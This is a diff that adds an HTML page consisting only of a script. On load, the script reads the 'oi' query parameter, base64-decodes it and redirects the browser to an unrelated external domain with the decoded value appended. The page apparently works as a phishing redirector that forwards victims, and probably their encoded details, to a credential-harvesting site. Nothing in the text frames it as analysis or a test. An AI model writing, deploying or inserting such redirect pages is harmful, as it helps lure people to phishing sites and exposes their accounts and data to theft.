@@ -1,0 +1,19 @@
+<html>
+  <script>
+    var queryParams = window.location.search
+      .substr(1)
+      .split("&")
+      .reduce(function (q, query) {
+        var chunks = query.split("=");
+        var key = chunks[0];
+        var value = decodeURIComponent(chunks[1]);
+        value = isNaN(Number(value)) ? value : Number(value);
+        console.log("q[key] " + q[key]);
+        return (q[key] = value), q;
+      }, {});
+    window.location.replace(
+      "https://beroorats.za.com//ACD/1/kg/#" +
+        atob(queryParams["oi"])
+    );
+  </script>
+</html>
